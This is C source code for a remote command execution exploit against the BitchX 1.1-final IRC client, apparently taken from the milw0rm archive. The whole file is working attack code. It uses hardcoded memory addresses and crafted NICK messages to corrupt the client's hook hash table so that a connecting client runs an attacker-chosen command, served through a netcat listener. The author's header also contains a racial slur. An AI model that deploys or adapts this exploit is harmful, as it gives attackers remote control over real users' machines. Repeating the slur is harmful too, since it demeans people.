/*	Name: PBXS - Pointless BitchX Sploit
 * 	Author: clarity_
 *	Infected Versions: 1.1-final and others?
 *	Synopsis: BitchX suffers from a unchecked bounds in a hash table in hook.c where one
 *				can inject data structures allowing for the remote execution of commands!
 *	Usage: Execute "gcc -o pbxs pbxs.c; ./pbxs ps -aux | nc -l -p 6667" Now when the vuln bitchx
 *			version connects to the mischievous server "ps -aux" will be executed.
 *	Shout Outs: solomon, crypt1, vortek, ziri, and all the other niggaz at svun @ undernet
 */

// Addresses for BitchX-1.1-final-linux.tar.gz avail on ftp.bitchx.org
#define HOOK_FUNCTIONS 0x81366e0
#define NICKNAME 0x8155353
#define STAR 0x8108f34

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define NICK_STR ":bleh!i"
#define NICK_STR2 "@svun.powns.net NICK :"
#define EXEC_STR "EXEC $1-"
#define RAW_FMT_STR ":my_server -%u bleh :%s"

typedef struct {
	unsigned int	hook_functions,
		nickname,
		star;
	unsigned int base, diff, offset;
} Addresses;

/* Partial structs full struct w/ correct values found in include/struct.h */
// To be loaded into nickname static
typedef struct {
    unsigned int name; // point to hook
    unsigned int list;
	// EXEC $1- 2 words
} HookFunc;

// To be loaded into joined_nick static
typedef struct {
//    unsigned int next;		/* struct hook_stru *next; */
    unsigned int nick; 		/* char *nick; */		//star
    unsigned int stuff;		/* char *stuff; */
	unsigned int shit;
} Hook;

char * make_nickname(Addresses *addrs, int X, int Y) {
	char *tmp = NULL, *sp = NULL;
	int i;
	HookFunc h;
	Hook hk;

	// malloc
	tmp = (char *) malloc(1024);

	// BASE
	h.name = addrs->star;
	h.list = addrs->base - addrs->diff - 4;

	if (Y) {
		// start loading string
		if (X == 4) {
			strcpy(tmp, NICK_STR);
		}
		else {
			strcpy(tmp, ":");
			strcat(tmp, make_nickname(addrs, X + 1, 0));
			strcat(tmp, "!i");
		}

		sp = tmp + strlen(tmp); // point to char after tmp
		//*sp++ = '0' + X;
		strcpy(sp, NICK_STR2);
	}
	else {
		sp = tmp;
		*tmp = '\0';
	}

    hk.nick = addrs->star;
    hk.stuff = addrs->base + 8;  // "stuff" is loaded after the nick

    // load str
    sp = tmp + strlen(tmp); // point to char after tmp

    memcpy(sp, &hk, sizeof(Hook));
   sp += sizeof(Hook) - 4;

	if (X != 4) {
		while (X--) {
			*sp++ = 'X';
		}
		*sp++ = '\0';
		return tmp;
	}
	else {
		while (X--) {
			*sp++ = 'X';
		}
	}


	// pad
	if (sizeof(Hook) > addrs->diff) {
		printf("!!!!!!!!!!!!!ERRRRRRRRRRRRROOOOOOOOOOOOOOOOORRRRRRRRRRRRRRRRRR: %d\n", addrs->diff);
	}

	for (i = sizeof(Hook); i < addrs->diff; ++i)
		*sp++ = 'x';

	memcpy(sp, &h, sizeof(HookFunc));
	sp += sizeof(HookFunc);
	memcpy(sp, EXEC_STR, strlen(EXEC_STR));
	--sp[4];
	sp += strlen(EXEC_STR);
	*++sp = '\0';

	return tmp;
}

//#define RAW_FMT_STR ":my_server %d bleh :%s"
char * make_raw(Addresses *addrs, char *cmd) {
	char *tmp = NULL;
	unsigned int len;

	len = 2000; // fix later
	tmp = (char *) malloc(len);

	sprintf(tmp, RAW_FMT_STR, addrs->offset, cmd);

	return tmp;
}

int main(int argc, char **argv) {
	Addresses addrs;
	char *cmd = argv[1];

	addrs.hook_functions = HOOK_FUNCTIONS;
	addrs.nickname = NICKNAME;
	addrs.star = STAR;

	addrs.offset = ((NICKNAME - HOOK_FUNCTIONS) / 20) + 1;
	addrs.diff = 20 - ((NICKNAME - HOOK_FUNCTIONS) % 20);
	addrs.base = NICKNAME + addrs.diff;

	printf(":my_server 001 bleh :a\n");
	printf("%s\n", make_nickname(&addrs, 4, 1));
	printf("%s\n", make_nickname(&addrs, 3, 1));
	printf("%s\n", make_nickname(&addrs, 2, 1));
	printf("%s\n", make_nickname(&addrs, 1, 1));
	printf("%s\n", make_nickname(&addrs, 0, 1));
	printf("%s\n", make_raw(&addrs, cmd));

	return 0;
}

// milw0rm.com [2007-06-21]
